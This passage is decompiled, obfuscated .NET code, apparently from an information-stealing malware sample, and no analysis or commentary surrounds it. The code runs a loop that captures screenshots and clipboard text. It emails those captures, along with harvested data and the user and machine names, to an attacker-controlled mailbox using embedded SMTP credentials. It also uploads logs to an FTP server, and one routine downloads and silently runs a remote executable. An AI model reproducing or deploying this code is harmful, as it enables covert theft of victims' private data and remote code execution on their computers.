							Stream requestStream = ftpWebRequest2.GetRequestStream();
							requestStream.Write(array, 0, array.Length);
							requestStream.Close();
							requestStream.Dispose();
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
				}
			}
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_4.Abort();
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
		}
		try
		{
		}
		catch (Exception projectError9)
		{
			ProjectData.SetProjectError(projectError9);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_2()
	{
		//IL_019d: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a4: Expected O, but got Unknown
		checked
		{
			int num = default(int);
			while (true)
			{
				Thread.Sleep(int_2);
				string text = "";
				string text2 = "";
				try
				{
					text = ((Operators.CompareString(string_40, Class6.smethod_0("mNHf1gY=", "False"), false) != 0) ? "" : (Class6.smethod_0("mpaiqZt8l6Kpm3yXoqmbfJeiqZt8l6Kpm3yXqNjHr7zUzdCjl6Kpm3yXoqmbfJeiqZt8l6Kpm3yXoqmbfJjCCg==", "False") + Environment.NewLine + Environment.NewLine + ((Computer)Class2.smethod_0()).get_Clipboard().GetText() + Environment.NewLine + Environment.NewLine + Class6.smethod_0("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False")));
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex, num);
					ProjectData.ClearProjectError();
				}
				double double_ = 0.2;
				smethod_0(ref double_);
				try
				{
					WebClient webClient = new WebClient();
					text2 = Class6.smethod_0("mJSgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWgp5l6laCnmXqVoKeZepWhxw0=", "False") + Environment.NewLine + Environment.NewLine + webClient.DownloadString(Class6.smethod_0("osnU15NphMHczanCwdvCqcOO3sGbycnaxrO+0JW8qcKP1Ylzh5OXkm6KjsjMqg0=", "False")) + Environment.NewLine + Environment.NewLine + Class6.smethod_0("enaCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeCiXtcd4KJe1x3gol7XHeDqSs=", "False");
				}
				catch (Exception ex2)
				{
					ProjectData.SetProjectError(ex2, num);
					text2 = "";
					ProjectData.ClearProjectError();
				}
				double_ = 1.0;
				smethod_0(ref double_);
				try
				{
					if (Operators.CompareString(string_54, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
					{
						Rectangle bounds = Screen.get_PrimaryScreen().get_Bounds();
						Bitmap val = new Bitmap(bounds.Width, bounds.Height, (PixelFormat)2498570);
						Graphics val2 = Graphics.FromImage((Image)(object)val);
						val2.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, (CopyPixelOperation)13369376);
						Bitmap val3 = val;
						((Image)val3).Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_3 + Class6.smethod_0("ZsPMzBI=", "False"));
					}
				}
				catch (Exception ex3)
				{
					ProjectData.SetProjectError(ex3, num);
					ProjectData.ClearProjectError();
				}
				double_ = 0.3;
				smethod_0(ref double_);
				try
				{
					if (Operators.CompareString(string_6, Class6.smethod_0("mNHf1gY=", "False"), false) == 0 && Operators.CompareString(string_63, "", false) != 0)
					{
						string_62 = Class6.smethod_0("fHiEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYSLYG2rrsFgXnmEi31eeYSLfV55hIt9XnmEi31eeYSLfV55hIt9XnmEi31eeYWrKQ==", "False") + Environment.NewLine + Environment.NewLine + string_63 + Environment.NewLine + Environment.NewLine + text2 + Environment.NewLine + Environment.NewLine + text;
						int num2 = 0;
						while (true)
						{
							try
							{
								num = 2;
								MailMessage mailMessage = new MailMessage();
								MailMessage mailMessage2 = mailMessage;
								mailMessage2.From = new MailAddress(string_1);
								mailMessage2.To.Add(string_1);
								mailMessage2.Subject = Class6.smethod_0("cKi3ureQpL3EY3CusXGJlq63i2Mi", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", "False") + Environment.MachineName.ToString();
								mailMessage2.Body = string_62;
								try
								{
									if (Operators.CompareString(string_54, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
									{
										Attachment item = new Attachment(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("j5vCw8SiwcjGxo+Ry8W2mLzNybOfwbXTtaWzvs4X", "False") + int_3 + Class6.smethod_0("ZsPMzBI=", "False"));
										mailMessage2.Attachments.Add(item);
									}
								}
								catch (Exception ex4)
								{
									ProjectData.SetProjectError(ex4, num);
									ProjectData.ClearProjectError();
								}
								mailMessage2 = null;
								SmtpClient smtpClient = new SmtpClient(string_8);
								SmtpClient smtpClient2 = smtpClient;
								smtpClient2.Port = int_0;
								smtpClient2.EnableSsl = true;
								smtpClient2.Credentials = new NetworkCredential(string_1, string_2);
								smtpClient2.Send(mailMessage);
								smtpClient2 = null;
							}
							catch (Exception ex5)
							{
								ProjectData.SetProjectError(ex5, num);
								if (num2 == 3)
								{
									ProjectData.ClearProjectError();
									return;
								}
								num2++;
								ProjectData.ClearProjectError();
								continue;
							}
							break;
						}
					}
				}
				catch (Exception ex6)
				{
					ProjectData.SetProjectError(ex6, num);
					ProjectData.ClearProjectError();
				}
				try
				{
					if (Operators.CompareString(string_7, Class6.smethod_0("mNHf1gY=", "False"), false) == 0)
					{
						string text3 = string_63;
						string text4 = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("kp7FxselxMvJyZKlwdDFgsDDkcmuxRI=", "False"));
						string contents = text4 + Environment.NewLine + Environment.NewLine + Class6.smethod_0("ioeSmYtsh5KZi2yHkpmLbIeSmYtsh5KZi2yHkpmLbIeSfBs=", "False") + Conversions.ToString(DateTime.Now.Date) + Class6.smethod_0("R3+KkYNkf4qRg2R/ipGDZH+KkYNkf4qRg2R/ipGDZH+KsSM=", "False") + Environment.NewLine + Environment.NewLine + text3 + Environment.NewLine + Environment.NewLine + text + Environment.NewLine + Environment.NewLine + text2;
						try
						{
							File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("dICnqKmHpq2rq3SHo7KnZKKlc6uQpzA=", "False"));
							File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("dICnqKmHpq2rq3SHo7KnZKKlc6uQpzA=", "False"), contents);
						}
						catch (Exception ex7)
						{
							ProjectData.SetProjectError(ex7, num);
							ProjectData.ClearProjectError();
						}
						smethod_3(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("dICnqKmHpq2rq3SHo7KnZKKlc6uQpzA=", "False"));
					}
				}
				catch (Exception ex8)
				{
					ProjectData.SetProjectError(ex8, num);
					ProjectData.ClearProjectError();
				}
				string_62 = "";
				string_63 = "";
				string_0 = "";
				int_3++;
			}
		}
	}

	public static void smethod_3(string string_64)
	{
		string text = ((!string_3.Contains(Class6.smethod_0("QqG6vXlPamgp", "False"))) ? (Class6.smethod_0("QqG6vXlPamgp", "False") + string_3) : string_3);
		string userName = string_4;
		string password = string_5;
		string text2 = ((ServerComputer)Class2.smethod_0()).get_Name().ToString();
		try
		{
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create(text + Class6.smethod_0("cwM=", "False") + text2);
			ftpWebRequest.Method = "MKD";
			ftpWebRequest.Credentials = new NetworkCredential(userName, password);
			ftpWebRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			FtpWebRequest ftpWebRequest2 = (FtpWebRequest)WebRequest.Create(text + Class6.smethod_0("cwM=", "False") + text2 + Class6.smethod_0("cwM=", "False") + Class6.smethod_0("erLBxMGarsfObXq4u5VtGA==", "False") + DateTime.Now.ToString() + Class6.smethod_0("Ta69wCs=", "False"));
			ftpWebRequest2.Credentials = new NetworkCredential(userName, password);
			ftpWebRequest2.Method = "STOR";
			byte[] array = File.ReadAllBytes(string_64);
			Stream requestStream = ftpWebRequest2.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			requestStream.Dispose();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_4()
	{
		int num = 0;
		int num3 = default(int);
		try
		{
			int num2 = Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class6.smethod_0("g7nP3cEJ", "False"))).Length;
			DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("eoatrq+NrLOxsXp7pa6ok6m3pyw=", Class6.smethod_0("g7nP3cEJ", "False")));
			FileInfo[] files = directoryInfo.GetFiles();
			double double_ = 25.0;
			smethod_0(ref double_);
			string body = Class6.smethod_0("lZGdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3krPbvpvBxdnMd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ3kp2klneSnaSWd5KdpJZ4sg4=", "False") + Environment.NewLine + Environment.NewLine + Class13.string_1 + Environment.NewLine + Environment.NewLine + Class7.string_0 + Environment.NewLine + Environment.NewLine + Class9.string_0 + Environment.NewLine + Environment.NewLine + Class15.string_0 + Environment.NewLine + Environment.NewLine + Class19.string_0 + Environment.NewLine + Environment.NewLine + Class23.string_0 + Environment.NewLine + Environment.NewLine + Class25.string_0 + Environment.NewLine + Environment.NewLine + Class27.string_0 + Environment.NewLine + Environment.NewLine + Class29.string_0 + Environment.NewLine + Environment.NewLine + Class31.string_0 + Environment.NewLine + Environment.NewLine + Class33.string_0 + Environment.NewLine + Environment.NewLine + Class37.string_0 + Environment.NewLine + Environment.NewLine + Class6.smethod_0("Z4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo2UhmeCjZSGZ4KNlIZngo0f", "False");
			if (!(((Operators.CompareString(string_12, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_13, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_14, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_15, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_22, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_23, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_24, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_25, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_26, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_27, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_28, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_29, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_30, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0) & (Operators.CompareString(string_31, Class6.smethod_0("g7nP3cEJ", "False"), false) == 0)) && num2 == 0))
			{
				while (true)
				{
					try
					{
						num3 = 2;
						MailMessage mailMessage = new MailMessage();
						MailMessage mailMessage2 = mailMessage;
						mailMessage2.From = new MailAddress(string_1);
						mailMessage2.To.Add(string_1);
						mailMessage2.Subject = Class6.smethod_0("YpqprKmClq+2VWmloaShe6OvY3uIoKl9VTA=", "False") + Environment.UserName.ToString() + Class6.smethod_0("aQ0=", Class6.smethod_0("g7nP3cEJ", "False")) + Environment.MachineName.ToString();
						mailMessage2.Body = body;
						try
						{
							FileInfo[] array = files;
							foreach (FileInfo fileInfo in array)
							{
								Attachment item = new Attachment(fileInfo.FullName);
								mailMessage2.Attachments.Add(item);
							}
						}
						catch (Exception ex)
						{
							ProjectData.SetProjectError(ex, num3);
							ProjectData.ClearProjectError();
						}
						mailMessage2 = null;
						SmtpClient smtpClient = new SmtpClient(string_8);
						SmtpClient smtpClient2 = smtpClient;
						smtpClient2.Port = int_0;
						smtpClient2.EnableSsl = true;
						smtpClient2.Credentials = new NetworkCredential(string_1, string_2);
						smtpClient2.Send(mailMessage);
						smtpClient2 = null;
					}
					catch (Exception ex2)
					{
						ProjectData.SetProjectError(ex2, num3);
						if (num == 3)
						{
							ProjectData.ClearProjectError();
							return;
						}
						num = checked(num + 1);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3, num3);
			ProjectData.ClearProjectError();
		}
		try
		{
			thread_7.Abort();
			thread_10.Abort();
			thread_11.Abort();
			thread_14.Abort();
			thread_3.Abort();
			thread_6.Abort();
			thread_12.Abort();
			thread_8.Abort();
			thread_13.Abort();
			thread_9.Abort();
			thread_15.Abort();
			thread_2.Abort();
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4, num3);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5()
	{
		try
		{
			WebClient webClient = new WebClient();
			string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + Class6.smethod_0("hZG4ubqYt768vIWlxLqxmKi2v3aOvLQg", "False");
			webClient.DownloadFile(string_47, text);
			double double_ = 15.0;
			smethod_0(ref double_);
			Interaction.Shell(text, (AppWinStyle)2, false, -1);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	[SpecialName]
	private static void smethod_6()
	{
		Class7.Class8.smethod_0();
	}

	[SpecialName]
	private static void smethod_7()
	{
		Class25.Class26.smethod_0();
	}

	[SpecialName]
	private static void smethod_8()
	{
		Class37.Class38.smethod_0();
	}

	[SpecialName]
	private static void smethod_9()
	{
		Class27.Class28.smethod_0();
	}
}
